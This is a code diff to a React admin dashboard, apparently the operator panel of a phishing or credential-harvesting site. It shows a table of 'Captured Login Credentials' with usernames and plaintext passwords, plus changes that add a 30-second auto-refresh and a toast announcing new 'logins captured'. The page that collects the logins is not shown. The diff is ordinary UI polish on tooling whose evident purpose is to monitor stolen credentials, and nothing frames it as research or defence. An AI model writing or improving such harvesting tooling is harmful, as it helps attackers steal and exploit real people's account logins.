@@ -13,10 +13,12 @@ import {
   TableRow,
 } from "@/components/ui/table";
 import { formatDistanceToNow } from 'date-fns';
+import { Loader2 } from 'lucide-react';
 
 const AdminDashboard = () => {
   const [credentials, setCredentials] = useState<Credential[]>([]);
   const [isLoading, setIsLoading] = useState(true);
+  const [isRefreshing, setIsRefreshing] = useState(false);
   const [error, setError] = useState<string | null>(null);
   const navigate = useNavigate();
 
@@ -25,15 +27,20 @@ const AdminDashboard = () => {
     
     // Set up auto-refresh every 30 seconds
     const intervalId = setInterval(() => {
-      loadCredentials();
+      loadCredentials(true);
     }, 30000);
     
     return () => clearInterval(intervalId);
   }, []);
 
-  const loadCredentials = async () => {
+  const loadCredentials = async (isAutoRefresh = false) => {
     try {
-      setIsLoading(true);
+      if (!isAutoRefresh) {
+        setIsLoading(true);
+      } else {
+        setIsRefreshing(true);
+      }
+      
       setError(null);
       console.log('Loading credentials...');
       const result = await getLoginCredentials();
@@ -41,24 +48,39 @@ const AdminDashboard = () => {
       if (result.success) {
         console.log('Successfully loaded credentials:', result.data);
         setCredentials(result.data);
-        if (result.data.length === 0) {
+        if (result.data.length === 0 && !isAutoRefresh) {
           toast.info('No credentials found. Waiting for logins...');
+        } else if (result.data.length !== credentials.length && isAutoRefresh) {
+          const newCount = result.data.length - credentials.length;
+          if (newCount > 0) {
+            toast.success(`${newCount} new login${newCount > 1 ? 's' : ''} captured!`);
+          }
         }
       } else {
         setError('Failed to load credentials');
-        toast.error('Failed to load credentials');
+        if (!isAutoRefresh) {
+          toast.error('Failed to load credentials');
+        }
       }
     } catch (error) {
       console.error('Error loading credentials:', error);
       setError('Something went wrong. Network error or service unavailable.');
-      toast.error('Something went wrong. Check your network connection.');
+      if (!isAutoRefresh) {
+        toast.error('Something went wrong. Check your network connection.');
+      }
     } finally {
       setIsLoading(false);
+      setIsRefreshing(false);
     }
   };
 
   const handleLogout = () => {
     navigate('/');
+  };
+
+  const handleManualRefresh = () => {
+    toast.info('Refreshing data...');
+    loadCredentials();
   };
 
   const formatTimestamp = (timestamp: string) => {
@@ -85,26 +107,39 @@ const AdminDashboard = () => {
           <div className="flex justify-between items-center mb-4">
             <h2 className="text-xl font-semibold">Captured Login Credentials</h2>
             <div className="flex items-center">
-              <Button onClick={loadCredentials} variant="outline" size="sm" className="ml-2">
-                Refresh Data
+              <Button 
+                onClick={handleManualRefresh} 
+                variant="outline" 
+                size="sm" 
+                className="ml-2"
+                disabled={isLoading || isRefreshing}
+              >
+                {isRefreshing ? (
+                  <>
+                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
+                    Refreshing...
+                  </>
+                ) : 'Refresh Data'}
               </Button>
             </div>
           </div>
           
           {isLoading ? (
-            <div className="text-center py-8">
+            <div className="text-center py-10">
+              <Loader2 className="h-8 w-8 animate-spin mx-auto mb-4" />
               <p>Loading credentials...</p>
             </div>
           ) : error ? (
             <div className="text-center py-8 text-red-400">
               <p>{error}</p>
-              <Button onClick={loadCredentials} variant="outline" className="mt-4">
+              <Button onClick={() => loadCredentials()} variant="outline" className="mt-4">
                 Try Again
               </Button>
             </div>
           ) : credentials.length === 0 ? (
-            <div className="text-center py-8">
-              <p>No credentials found</p>
+            <div className="text-center py-10 border border-dashed border-gray-700 rounded-md">
+              <p className="text-gray-400">No credentials found</p>
+              <p className="text-sm text-gray-500 mt-2">Login attempts will appear here</p>
             </div>
           ) : (
             <div className="overflow-x-auto">
@@ -119,13 +154,26 @@ const AdminDashboard = () => {
                 <TableBody>
                   {credentials.map((cred) => (
                     <TableRow key={cred._id}>
-                      <TableCell>{cred.username}</TableCell>
+                      <TableCell className="font-medium">{cred.username}</TableCell>
                       <TableCell>{cred.password}</TableCell>
                       <TableCell>{formatTimestamp(cred.timestamp)}</TableCell>
                     </TableRow>
                   ))}
                 </TableBody>
               </Table>
+            </div>
+          )}
+          
+          {!isLoading && credentials.length > 0 && (
+            <div className="mt-4 text-right text-sm text-gray-500">
+              {isRefreshing ? (
+                <span className="flex items-center justify-end">
+                  <Loader2 className="mr-1 h-3 w-3 animate-spin" />
+                  Refreshing...
+                </span>
+              ) : (
+                <span>Auto-refreshes every 30 seconds</span>
+              )}
             </div>
           )}
         </div>
